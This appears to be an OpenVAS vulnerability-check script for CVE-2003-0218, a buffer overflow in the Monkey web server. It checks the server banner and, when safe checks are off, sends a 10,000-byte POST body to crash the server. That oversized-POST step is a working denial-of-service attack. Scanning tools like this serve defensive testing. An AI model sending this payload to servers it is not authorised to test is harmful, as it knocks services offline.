if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11544" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2003-0218" );
	script_bugtraq_id( 7202 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "MonkeyWeb POST with too much data" );
	script_category( ACT_MIXED_ATTACK );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80, 2001 );
	script_mandatory_keys( "Monkey/banner" );
	script_tag( name: "solution", value: "Upgrade to Monkey web server 0.6.2." );
	script_tag( name: "summary", value: "The Monkey web server crashes when it receives a
  POST command with too much data.

  It *may* even be possible to make this web server execute arbitrary code with this attack." );
	script_tag( name: "insight", value: "The version of Monkey web server that is running
  is vulnerable to a buffer overflow on a POST command with too much data." );
	script_tag( name: "impact", value: "It is possible to make this web server crash or execute
  arbitrary code." );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
if(safe_checks()){
	banner = http_get_remote_headers( port: port );
	if(IsMatchRegexp( banner, "Server: *Monkey/0\\.([0-5]\\.|6\\.[01])" )){
		report = report_fixed_ver( installed_version: "See server banner", fixed_version: "0.6.2" );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
l = http_get_kb_cgis( port: port, host: "*" );
if( isnull( l ) ) {
	script = "/";
}
else {
	n = rand() % max_index( l );
	script = ereg_replace( string: l[n], pattern: " - .*", replace: "" );
	if(!script){
		script = "/";
	}
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = http_post( item: script, port: port, data: crap( 10000 ) );
if(!ContainsString( req, "Content-Type:" )){
	req = ereg_replace( string: req, pattern: "Content-Length:", replace: "Content-Type: application/x-www-form-urlencoded\r\nContent-Length:" );
}
send( socket: soc, data: req );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	set_kb_item( name: "www/too_big_post_crash", value: TRUE );
	exit( 0 );
}
exit( 99 );

